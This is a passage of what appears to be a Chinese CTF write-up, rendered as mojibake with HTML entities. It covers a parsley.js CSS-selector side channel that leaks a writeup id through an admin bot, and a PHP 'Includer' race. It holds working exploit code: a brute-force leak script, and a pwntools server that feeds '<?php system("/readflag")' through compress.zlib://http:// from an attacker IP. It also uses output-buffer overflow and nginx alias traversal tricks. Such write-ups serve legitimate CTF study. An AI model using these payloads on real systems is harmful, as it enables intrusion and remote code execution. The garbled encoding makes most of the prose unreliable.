æ‰“å¼€ä½ çš„ writeup å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š id ä¸º like çš„ input æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡ selenium.webdriverè°ƒç”¨find_element_by_xpathå‡½æ•°å¾—åˆ°çš„ id ä¸º like çš„ input å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨ writeup å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œadmin ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ input ã€‚\nå¹¶ä¸” CSP ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š parsley.js çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº› Payload ã€‚\né¦–å…ˆï¼Œå› ä¸ºfind_element_by_xpathåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡ parsley.js å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„ id ä¸º like çš„ input æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚\nä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹ admin è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢\n \né¡µé¢ä¸Šéƒ¨åˆ†æ˜¯ header.php ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„ writeup ï¼Œä¹Ÿå°±æ˜¯è¯´ admin çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª a æ ‡ç­¾å°±æ˜¯ flag çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å– writeup id çš„äº‹æƒ…äº†ã€‚\nCSS Selector å¦‚ä½•è·å– a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„data-parsley-errors-container API æœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª API åˆæ”¯æŒ CSS é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ CSS é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª a æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚\nç±»ä¼¼ä¹‹å‰ XCTF Final ä¸€ä¸ª CSS ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨a[href^='/show.php?id={flag}]çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„ id=like input æ ‡ç­¾æ’å…¥åˆ°è¯¥ a æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤ like è¯·æ±‚çš„ input æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley.js ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„ writeup é¡µé¢çœ‹åˆ° admin çš„ç‚¹èµã€‚\næ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å– flag çš„ writeup idã€‚\nè„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š\nimport requests import time s = requests.Session() base_url = \u0026#34;http://ip:8001/\u0026#34; res = s.get(base_url) pos = res.text.find(\u0026#39;name=\u0026#34;c\u0026#34; value=\u0026#34;\u0026#39;) + len(\u0026#39;name=\u0026#34;c\u0026#34; value=\u0026#34;\u0026#39;) csrftoken = res.text[pos:pos+16] ss = \u0026#34;1234567890abcdef\u0026#34; flag = \u0026#34;\u0026#34; for i in range(16): for j in ss: payload = f\u0026#34;\u0026lt;form data-parsley-validate\u0026gt;\u0026lt;input data-parsley-required data-parsley-trigger=\\\u0026#34;blur\\\u0026#34;data-parsley-error-message=\u0026#39;\u0026lt;input type=\\\u0026#34;input\\\u0026#34;id=like value=\\\u0026#34;rebirth_is_really_nb\\\u0026#34;\u0026gt;\u0026#39; data-parsley-errors-container=\\\u0026#34;a[href^=\u0026#39;/show.php?id={flag + j}\u0026#39;]\\\u0026#34;autofocus\u0026gt;\u0026lt;/form\u0026gt;\u0026#34; data = {\u0026#39;c\u0026#39;: csrftoken, \u0026#39;content\u0026#39;: payload} res = s.post(base_url + \u0026#34;add.php\u0026#34;, data=data, allow_redirects=False) # print(res.headers) location = res.headers[\u0026#39;Location\u0026#39;] pos = location.find(\u0026#39;id=\u0026#39;) + 3 wp = location[pos:] data = {\u0026#39;c\u0026#39;: csrftoken, \u0026#39;id\u0026#39;: wp} res = s.post(base_url + \u0026#34;admin.php\u0026#34;, data=data) time.sleep(3) res = s.get(f\u0026#34;http://ip:8001/show.php?id={wp}\u0026#34;) # print(res.text) txt = res.text.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;\\r\u0026#34;, \u0026#34;\u0026#34;) if \u0026#34;Liked by\u0026lt;/h3\u0026gt;admin\u0026#34; not in txt: flag += j print(i,flag) break æ‹¿åˆ° writeup id ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š\n \nOther Selector å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨ a æ ‡ç­¾çš„ href å±æ€§è¿›è¡Œè·å– writeup idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ value å€¼ï¼Œä¾‹å¦‚ï¼š\n\u0026lt;form data-parsley-validate\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;like\u0026#34; data-parsley-trigger=\u0026#34;blur\u0026#34; autofocus name=\u0026#34;some-field\u0026#34; data-parsley-error-message=\u0026#34;\u0026lt;input id=like type=button\u0026gt;\u0026#34; data-parsley-required data-parsley-errors-container=\u0026#34;a:contains(\u0026#39;Writeup - 5\u0026#39;):eq(0)\u0026#34; /\u0026gt;\u0026lt;/form\u0026gt; æˆ–è€…ä½¿ç”¨data-parsley-equalto API è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š\n data-parsley-equalto=\u0026quot;#anotherfield\u0026quot;\nValidates that the value is identical to another field\u0026rsquo;s value (useful for password confirmation check).\n \u0026lt;form data-parsley-validate\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; data-parsley-trigger=\u0026#34;focusout\u0026#34; data-parsley-equalto=\u0026#39;a[href^=\u0026#34;/show.php?id=GUESS\u0026#34;]\u0026#39; data-parsley-errors-container=\u0026#34;form[action=\u0026#39;/like.php\u0026#39;]\u0026#34; data-parsley-error-message=\u0026#39;\u0026lt;input type=\u0026#34;input\u0026#34; name=\u0026#34;id\u0026#34; value=\u0026#34;0000000000000000\u0026#34;\u0026gt;\u0026#39; value=\u0026#39;a[href^=\u0026#34;/show.php?id=GUESS\u0026#34;]\u0026#39; autofocus\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Includer  Difficulty estimate: medium\nSolved:9/321\nPoints: round(1000 Â· min(1, 10 / (9 + [9 solves]))) = 556 points\nDescription:\nJust sitting here and waiting for PHP 8.0 (lolphp).\nDownload:\nincluder-df39401c4c1c28ab.tar.xz (3.5 KiB)\n é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;?php declare(strict_types=1); $rand_dir = \u0026#39;files/\u0026#39;.bin2hex(random_bytes(32)); mkdir($rand_dir) || die(\u0026#39;mkdir\u0026#39;); putenv(\u0026#39;TMPDIR=\u0026#39;.__DIR__.\u0026#39;/\u0026#39;.$rand_dir) || die(\u0026#39;putenv\u0026#39;); echo \u0026#39;Hello \u0026#39;.$_POST[\u0026#39;name\u0026#39;].\u0026#39; your sandbox: \u0026#39;.$rand_dir.\u0026#34;\\n\u0026#34;; try { if (stripos(file_get_contents($_POST[\u0026#39;file\u0026#39;]), \u0026#39;\u0026lt;?\u0026#39;) === false) { include_once($_POST[\u0026#39;file\u0026#39;]); } } finally { system(\u0026#39;rm -rf \u0026#39;.escapeshellarg($rand_dir)); } Configuration Error å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š\nlocation /.well-known { autoindex on; alias /var/www/html/well-known/; } å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚\nUpload Arbitrary Data ä¸€å¼€å§‹æˆ‘çœ‹åˆ°è¿™ä¸ªæ²¡æœ‰\u0026lt;?çš„å½¢å¼ï¼Œæˆ‘æƒ³åˆ°çš„æ˜¯pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡ exit çš„å†…å®¹ï¼Œè°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ï¼Œå¥ˆä½•åŸæ–‡ç”¨çš„æ˜¯file_put_contentï¼Œæˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯file_get_contentsï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†file_get_contentså‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰\u0026lt;?ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚\nè€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†putenv()å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ª sandbox ï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ å•¥çš„æ“ä½œã€‚\nbalsn é˜Ÿä¼åœ¨å…¬å¼€çš„ wp ä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„ wp è¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚\né¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨compress.zip://æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚\nåœ¨ php-src æºä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°php_stream_gzopen\next/zlib/zlib_fopen_wrapper.c\nphp_stream *php_stream_gzopen(php_stream_wrapper *wrapper, const char *path, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC) { ... if (strncasecmp(\u0026#34;compress.zlib://\u0026#34;, path, 16) == 0) { path += 16; } else if (strncasecmp(\u0026#34;zlib:\u0026#34;, path, 5) == 0) { path += 5; } innerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context); ... return NULL; } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½STREAM_WILL_CASTï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨main/php_streams.hå®šä¹‰äº†è¯¥æ ‡å¿—ä½:\n/* If you are going to end up casting the stream into a FILE* or * a socket, pass this flag and the streams/wrappers will not use * buffering mechanisms while reading the headers, so that HTTP * wrapped streams will work consistently. * If you omit this flag, streams will use buffering and should end * up working more optimally. * */ #define STREAM_WILL_CAST 0x00000020 å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°† stream è½¬æ¢æˆ FILE* çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚\næ¥ç€æˆ‘ä»¬è·Ÿè¿›php_stream_open_wrapper_exå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨main/php_streams.hä¸­è¢« define ä¸º_php_stream_open_wrapper_exã€‚\nPHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options, zend_string **opened_path, php_stream_context *context STREAMS_DC) { //... \tif (stream != NULL \u0026amp;\u0026amp; (options \u0026amp; STREAM_MUST_SEEK)) { php_stream *newstream; switch(php_stream_make_seekable_rel(stream, \u0026amp;newstream, (options \u0026amp; STREAM_WILL_CAST) ? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE)) //... \treturn stream; } /* }}} */ è¯¥å‡½æ•°è°ƒç”¨äº†php_stream_make_seekable_relï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†STREAM_WILL_CASTå‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›php_stream_make_seekable_relå‡½æ•°ï¼Œå®ƒåœ¨main/php_streams.hä¸­è¢« define ä¸º_php_stream_make_seekableï¼Œç»§ç»­è·Ÿè¿›\nmain/streams/cast.c\n/* {{{ php_stream_make_seekable */ PHPAPI int _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, int flags STREAMS_DC) { if (newstream == NULL) { return PHP_STREAM_FAILED; } *newstream = NULL; if (((flags \u0026amp; PHP_STREAM_FORCE_CONVERSION) == 0) \u0026amp;\u0026amp; origstream-\u0026gt;ops-\u0026gt;seek != NULL) { *newstream = origstream; return PHP_STREAM_UNCHANGED; } /* Use a tmpfile and copy the old streams contents into it */ if (flags \u0026amp; PHP_STREAM_PREFER_STDIO) { *newstream = php_stream_fopen_tmpfile(); } else { *newstream = php_stream_temp_new(); } //... } /* }}} */ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœflagsä¸PHP_STREAM_PREFER_STDIOéƒ½è¢«è®¾ç½®çš„è¯ï¼Œè€ŒPHP_STREAM_PREFER_STDIOåœ¨ main/php_streams.h ä¸­å·²ç»è¢« define\n#define PHP_STREAM_PREFER_STDIO\t1 æˆ‘ä»¬åªéœ€è¦å…³å¿ƒ flags çš„å€¼å°±å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®š flags çš„å€¼éé›¶å³å¯ï¼Œæ ¹æ®å‰é¢çš„è·Ÿè¿›æˆ‘ä»¬æ˜“çŸ¥ flags çš„åœ¨è¿™é‡Œéé›¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è°ƒç”¨äº†php_stream_fopen_tmpfileå‡½æ•°åˆ›å»ºäº†ä¸´æ—¶æ–‡ä»¶ã€‚\näºæ˜¯æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªç®€å•çš„éªŒè¯ï¼Œåœ¨æœ¬æœºä¸Šè·‘æºä»£ç ï¼Œå¹¶ç”¨ pwntools èµ·ä¸€ä¸ªæœåŠ¡ç”¨æ¥å‘é€ä¸€ä¸ªå¤§æ–‡ä»¶\nfrom pwn import * import requests import re import threading import time def send_chunk(l, data): l.send(\u0026#39;\u0026#39;\u0026#39;{}\\r{}\\r\u0026#39;\u0026#39;\u0026#39;.format(hex(len(data))[2:], data)) while(True): l = listen(9999) l.wait_for_connection() data1 = \u0026#39;\u0026#39;.ljust(1024 * 8, \u0026#39;X\u0026#39;) data2 = \u0026#39;\u0026lt;?php system(\u0026#34;/readflag\u0026#34;); exit(); /*\u0026#39;.ljust(1024 * 8, \u0026#39;b\u0026#39;) data3 = \u0026#39;c*/\u0026#39;.rjust(1024 * 8, \u0026#39;c\u0026#39;) l.recvuntil(\u0026#39;\\r\\n\\r\\n\u0026#39;) l.send(\u0026#39;\u0026#39;\u0026#39;HTTP/1.1 200 OK\\rContent-Type: exploit/revxakep\\rConnection: close\\rTransfer-Encoding: chunked\\r\\r\u0026#39;\u0026#39;\u0026#39;) send_chunk(l, data1) print(\u0026#39;waiting...\u0026#39;) print(\u0026#39;sending php code...\u0026#39;) send_chunk(l, data2) sleep(3) send_chunk(l, data3) l.send(\u0026#39;\u0026#39;\u0026#39;0\\r\\r\\r\u0026#39;\u0026#39;\u0026#39;) l.close() è¿™æ ·æˆ‘åœ¨æœ¬æœºä¸Šç”¨ fswatch å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶å·²ç»ç”Ÿæˆï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹å°±æ˜¯æˆ‘ä»¬å‘é€çš„å†…å®¹ã€‚\n \nKeep Temp File ä¸´æ—¶æ–‡ä»¶ç»ˆç©¶è¿˜æ˜¯ä¼šè¢« php åˆ é™¤æ‰çš„ï¼Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡ŒåŒ…å«çš„è¯ï¼Œå°±éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è®©ä¸´æ—¶æ–‡ä»¶å°½å¯èƒ½ä¹…çš„ç•™å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬æ‰æœ‰æœºä¼šå»åŒ…å«å®ƒã€‚\næ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘ä»¬éœ€è¦ç«äº‰çš„ç¬¬ä¸€ä¸ªç‚¹ï¼ŒåŸºæœ¬ä¸Šæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•è®©å®ƒåœç•™æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼š\n ä½¿ç”¨å¤§æ–‡ä»¶ä¼ è¾“ï¼Œè¿™æ ·åœ¨ä¼ è¾“çš„æ—¶å€™å°±ä¼šæœ‰ä¸€å®šçš„æ—¶é—´è®©æˆ‘ä»¬åŒ…å«åˆ°æ–‡ä»¶äº†ã€‚ ä½¿ç”¨ FTP é€Ÿåº¦æ§åˆ¶ï¼Œå¤§æ–‡ä»¶ä¼ è¾“æ ¹æœ¬ä¸Šè¿˜æ˜¯ä¼ è¾“é€Ÿåº¦çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼é™åˆ¶ä¼ è¾“é€Ÿç‡ï¼Œæ¯”è¾ƒç®€å•çš„ä¹Ÿå¯ä»¥åˆ©ç”¨compress.zlib://ftp://å½¢å¼ï¼Œæ§åˆ¶ FTP é€Ÿåº¦å³å¯  Bypass Waf æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦çœ‹å¦‚ä½•æ¥å¯¹å…³é”®åœ°æ–¹è¿›è¡Œç»•è¿‡äº†ã€‚\nif (stripos(file_get_contents($_POST[\u0026#39;file\u0026#39;]), \u0026#39;\u0026lt;?\u0026#39;) === false) { include_once($_POST[\u0026#39;file\u0026#39;]); } è¿™ä¸ªåœ°æ–¹é—®äº†å¾ˆå¤šå¸ˆå‚…ï¼ŒåŒ…æ‹¬ä¸€è¡€çš„ TokyoWesterns çš„é˜Ÿå‘˜ä»¥åŠå‚è€ƒäº†ä¸»è¦çš„å…¬å¼€ WPï¼ŒåŸºæœ¬éƒ½æ˜¯åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æç«¯çš„æ—¶é—´çª—è¿›è¡Œç»•è¿‡ã€‚\nä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æå…¶ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±çš„æœåŠ¡å…ˆå‘é€ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œè¿™æ—¶å€™é€šè¿‡striposçš„åˆ¤æ–­å°±æ˜¯æ²¡æœ‰ PHP ä»£ç çš„æ–‡ä»¶æ•°æ®ï¼Œæ¥ç€æˆ‘ä»¬åˆ©ç”¨ HTTP é•¿é“¾æ¥çš„å½¢å¼ï¼Œåªè¦è¿™ä¸ªé“¾æ¥ä¸æ–­å¼€ï¼Œåœ¨æˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘é€ç¬¬äºŒæ®µå«æœ‰ PHP ä»£ç çš„æ•°æ®äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿include_onceåŒ…å«æˆ‘ä»¬çš„ä»£ç äº†ã€‚\nå› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ–¹æ³•åªèƒ½åˆ©ç”¨ç«äº‰çš„å½¢å¼å»åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬éœ€è¦ç«äº‰çš„ç‚¹ã€‚\nLeak Dir path æœ€åï¼Œè¦åšåˆ°æ–‡ä»¶åŒ…å«ï¼Œè‡ªç„¶å¾—å…ˆçŸ¥é“å®ƒçš„æ–‡ä»¶è·¯å¾„ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆä¸å¾—ä¸é€šè¿‡æŸäº›æ–¹å¼å»è·å–è·¯å¾„ã€‚\nè™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„ sandbox è·¯å¾„ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„ name å‚æ•°ï¼Œå¯¼è‡´ PHP output buffer æº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š\ndata = \u0026#39;\u0026#39;\u0026#39;file=compress.zlib://http://192.168.151.132:8080\u0026amp;name=\u0026#39;\u0026#39;\u0026#39;.strip() + \u0026#39;a\u0026#39; * (1024 * 7 + 882) r.send(\u0026#39;\u0026#39;\u0026#39;POST / HTTP/1.1\\rHost: localhost\\rConnection: close\\rContent-Length: {}\\rContent-Type: application/x-www-form-urlencoded\\rCookie: PHPSESSID=asdasdasd\\r\\r{}\\r\u0026#39;\u0026#39;\u0026#39;.format(len(data), data)) Get Flag æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š\n åˆ©ç”¨ compress.zlib://http://orcompress.zlib://ftp:// æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ HTTP é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶ åˆ©ç”¨è¶…é•¿çš„ name æº¢å‡º output buffer å¾—åˆ° sandbox è·¯å¾„ åˆ©ç”¨ Nginx é…ç½®é”™è¯¯ï¼Œé€šè¿‡ .well-known../files/sandbox/æ¥è·å–æˆ‘ä»¬ tmp æ–‡ä»¶çš„æ–‡ä»¶å å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„ tmp æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰ PHP ä»£ç  ç»•è¿‡ WAF åˆ¤æ–­åï¼Œå‘é€ PHP ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„ PHP ä»£ç æ‹¿åˆ° Flag  æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹(æ¥è‡ª @wupco)ï¼š\n éœ€è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ ä¼ å…¥nameè¿‡å¤§ overflow output bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡file_get_contentsè·å–çš„å†…å®¹ä¸å¸¦æœ‰\u0026lt;?,includeçš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ .well-known../files/æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶  ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰ hit ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡ @rebirth 